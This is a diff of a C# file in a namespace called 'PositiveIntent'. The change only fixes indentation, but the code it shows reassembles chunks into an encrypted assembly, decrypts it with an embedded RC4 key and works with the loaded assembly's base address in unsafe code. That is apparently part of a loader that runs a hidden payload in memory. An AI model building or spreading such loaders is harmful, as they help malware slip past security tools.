@@ -17,18 +17,18 @@ namespace PositiveIntent
 
             // Calculate total size
             int totalSize = 0;
-                foreach (var chunk in chunks)
-                    totalSize += chunk.Length;
+            foreach (var chunk in chunks)
+                totalSize += chunk.Length;
 
-                // Reconstruct original file
-                byte[] encryptedAssembly = new byte[totalSize];
-                int position = 0;
+            // Reconstruct original file
+            byte[] encryptedAssembly = new byte[totalSize];
+            int position = 0;
 
-                foreach (var chunk in chunks)
-                {
-                    Array.Copy(chunk, 0, encryptedAssembly, position, chunk.Length);
-                    position += chunk.Length;
-                }
+            foreach (var chunk in chunks)
+            {
+                Array.Copy(chunk, 0, encryptedAssembly, position, chunk.Length);
+                position += chunk.Length;
+            }
 
             RC4 rc4 = new RC4(RC4.key);
 
@@ -43,7 +43,7 @@ namespace PositiveIntent
 
             // Get base address of loaded assembly
             IntPtr assemblyBaseAddress = Marshal.GetHINSTANCE(assembly.GetModules()[0]);
-
+            
             unsafe
             {
                 // Get pointer to assembly's base address
